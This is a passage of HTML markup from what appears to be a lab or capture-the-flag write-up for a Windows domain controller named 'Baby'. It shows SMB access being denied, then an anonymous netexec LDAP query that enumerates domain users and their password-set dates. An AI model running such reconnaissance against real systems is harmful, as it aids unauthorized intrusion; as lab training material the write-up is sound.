style=\"--0:#B392F0;--1:#B392F0\">domain:baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">signing:True\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMBv1:False\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [+] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] Error enumerating shares: STATUS_ACCESS_DENIED\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Access\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Denied}\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">A\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">process\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">has\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">requested\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">access\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">to\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">an\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">object\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">but\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">has\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">been\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">granted\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">those\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">access\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">rights.\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We see here that our access is blocked using in \u003Ccode>SMB\u003C/code>, let’s  try \u003Ccode>LDAP\u003C/code> using \u003Ccode>netexec\u003C/code> again\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:167ch\">\u003Ccode>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:1ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">netexec\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ldap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">babydc.baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--users\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [*] Windows Server 2022 Build 20348 (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">name:BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">domain:baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [+] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [*] Enumerated 9 domain users: baby.vl\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Username-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Last\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">PW\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Set-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">       \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-BadPW-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Description-\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Guest\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;never>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Built-in\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">account\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">guest\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">access\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">to\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">the\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">computer/domain\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Jacqueline.Barnett\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">            \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:03\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Ashley.Webb\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:03\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Hugh.George\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:03\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Leonard.Dyer\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:03\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Connor.Wilkinson\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">              \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:08\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">12\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Joseph.Hughes\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                 \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:08\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">13\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Kerry.Wilson\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:11:08\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">14\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Teresa.Bell\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:14:37\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003Cspan 